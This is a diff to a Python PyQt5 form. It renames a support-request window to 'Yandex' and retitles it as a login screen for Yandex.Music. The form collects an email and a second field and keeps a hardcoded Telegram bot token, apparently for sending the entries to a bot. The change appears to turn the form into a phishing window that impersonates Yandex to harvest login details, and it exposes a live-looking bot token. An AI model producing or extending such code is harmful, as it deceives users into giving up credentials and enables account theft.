@@ -5,11 +5,11 @@ from PyQt5.QtWidgets import QWidget
 from validate_email import validate_email
 
 
-class Support(QWidget, Ui_Form):
+class Yandex(QWidget, Ui_Form):
     def __init__(self):
         super().__init__()
-        self.setupUi(self)
-        self.setWindowTitle('Поддержка')
+        self.yandexUi(self)
+        self.setWindowTitle('Вход в Яндекс.Музыка')
         self.okButton.hide()
         self.messageLabel.hide()
         self.pushButton.clicked.connect(self.run)
@@ -22,12 +22,12 @@ class Support(QWidget, Ui_Form):
             if not bool(mail):
                 mail = str(None)
             else:
-                flag = Support.check(self, mail)
+                flag = Yandex.check(self, mail)
                 if not flag:
                     self.label_2.setText("Такой почты не существует")
                     raise TypeError
             if not bool(problem):
-                self.label_3.setText("Опишите проблему")
+                self.label_3.setText("Заполните все поля")
                 raise TypeError
             information = [mail, problem]
             token = '5786906777:AAF4Prtt-Xx8PNw6gXSDx7n6_6nu-SqF6LI'
@@ -44,7 +44,7 @@ class Support(QWidget, Ui_Form):
             self.messageLabel.show()
         except Exception as error:
             pass
-    
+
     def check(self, mail):
         is_valid = validate_email(mail)
         return is_valid
